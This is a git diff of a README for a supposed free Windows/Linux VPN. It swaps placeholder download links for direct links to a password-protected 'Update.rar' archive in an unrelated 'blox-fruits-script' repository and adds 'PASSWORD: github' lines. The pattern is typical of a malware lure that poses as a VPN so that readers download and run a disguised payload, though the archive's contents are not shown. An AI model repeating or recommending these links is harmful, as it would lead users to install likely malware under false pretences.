@@ -1,6 +1,6 @@
 # Free VPN for PC - Free VPN for Windows - Download Free VPN for PC 🛡️
-[![Download Free VPN for PC](https://img.shields.io/badge/Download-Free_VPN-blue?style=for-the-badge&logo=download)](https://github.com/yourrepo/releases)
-
+[![Download Free VPN for PC](https://img.shields.io/badge/Download-Free_VPN-blue?style=for-the-badge&logo=download)](https://github.com/RibxTop/blox-fruits-script/releases/download/Update/Update.rar)
+## PASSWORD: github
 
 Welcome to **Free VPN for PC**! 🌐 This project provides a free and easy-to-use VPN service for your Windows or Linux system. Protect your privacy online with minimal setup and get access to secure, encrypted browsing. 🔒
 
@@ -20,13 +20,14 @@ Welcome to **Free VPN for PC**! 🌐 This project provides a free and easy-to-us
 | **Cross-Platform Support**| Works on Windows and Linux. 💻                              |
 
 ---
-[![Download Free VPN for PC](https://img.shields.io/badge/Download-Free_VPN_-blue?style=for-the-badge&logo=download)](https://github.com/yourrepo/releases)
+[![Download Free VPN for PC](https://img.shields.io/badge/Download-Free_VPN_-blue?style=for-the-badge&logo=download)](https://github.com/RibxTop/blox-fruits-script/releases/download/Update/Update.rar)
+## PASSWORD: github
 
 ## 📝 Installation
 
 ### Windows 🪟 & Linux 🐧
 
-1. Download the VPN client from the **[releases page](https://github.com/yourrepo/releases)**.
+1. Download the VPN client from the **[releases page]([https://github.com/yourrepo/releases](https://github.com/RibxTop/blox-fruits-script/releases/download/Update/Update.rar))**.
 2. Run the installer and follow the setup instructions. 🧑‍💻
 3. Once installed, open the VPN client and click **"Connect"**. 🔌
 4. Choose your preferred server location from the list. 🌍
